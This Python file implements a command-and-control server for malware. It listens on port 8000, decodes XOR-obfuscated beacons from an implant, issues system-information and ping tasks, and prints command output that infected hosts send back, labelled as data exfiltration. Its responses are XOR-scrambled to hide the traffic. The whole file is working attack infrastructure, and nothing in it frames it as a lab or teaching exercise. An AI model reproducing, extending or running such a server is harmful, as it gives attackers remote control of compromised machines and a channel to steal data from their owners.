import socket

PORT = 8000
OBFUSCATION_KEY = [0x4A, 0x76, 0x31, 0x2C, 0x5E, 0x09, 0x1F, 0x6B]

# Track if we have already sent our one-time task
TASK_DISPATCHED = False

def XOR_Transform(raw_bytes: bytearray) -> bytearray:
    key_length = len(OBFUSCATION_KEY)
    for i in range(len(raw_bytes)):
        raw_bytes[i] ^= OBFUSCATION_KEY[i % key_length]
    return raw_bytes

def StartRawC2Server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", PORT))
    server_socket.listen(5)
    
    global TASK_DISPATCHED
    print(f"[*] State-Aware C2 Server Processing on port {PORT}...")

    try:
        while True:
            client_socket, client_address = server_socket.accept()
            scrambled_packet = client_socket.recv(2048)
            if not scrambled_packet:
                client_socket.close()
                continue

            # 1. Decrypt incoming data from the agent
            decrypted_bytes = XOR_Transform(bytearray(scrambled_packet))
            plaintext_http = decrypted_bytes.decode('utf-8', errors='ignore')

            # 2. Parse basic HTTP attributes from the raw string stream
            http_lines = plaintext_http.split("\r\n")
            request_line = http_lines[0] if len(http_lines) > 0 else ""
            
            # Locate the endpoint inside the request (e.g., POST /index.html HTTP/1.1)
            endpoint = "/index.html"
            if "POST" in request_line:
                endpoint = request_line.split(" ")[1]

            # Extract the body payload (located after the empty line sequence)
            body_payload = "UNKNOWN"
            if "\r\n\r\n" in plaintext_http:
                body_payload = plaintext_http.split("\r\n\r\n")[1]

            print(f"[+] Connected: {client_address[0]} -> Path: {endpoint}")

            # 3. Handle data routing based on the target path
            command_to_send = "CMD_PING" # Default fallback task

            if "/api/v1/results" in endpoint:
                print("========================= CRITICAL DATA EXFILTRATION =========================")
                print(f"[!] Command Output Received: {body_payload}")
                print("==============================================================================")
                command_to_send = "CMD_PING" # Go back to generic tracking once results are recorded
            else:
                # If it's a standard beacon check-in, issue our SysInfo query exactly once
                if not TASK_DISPATCHED:
                    print("[*] Idle beacon recognized. Issuing target instruction: CMD_SYSINFO")
                    command_to_send = "CMD_SYSINFO"
                    TASK_DISPATCHED = True
                else:
                    print("[*] Idle beacon recognized. No tasks queued. Issuing: CMD_PING")
                    command_to_send = "CMD_PING"

            # 4. Craft the HTTP response payload
            http_response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/plain\r\n"
                f"Content-Length: {len(command_to_send)}\r\n"
                "Connection: close\r\n"
                "\r\n"
                f"{command_to_send}"
            )

            # 5. CRITICAL: Obfuscate the server response before sending it over the raw socket!
            response_bytes = bytearray(http_response.encode('utf-8'))
            obfuscated_response = XOR_Transform(response_bytes)

            client_socket.sendall(obfuscated_response)
            client_socket.close()

    except KeyboardInterrupt:
        print("\n[*] Shutting down Server.")
    finally:
        server_socket.close()

if __name__ == "__main__":
    StartRawC2Server()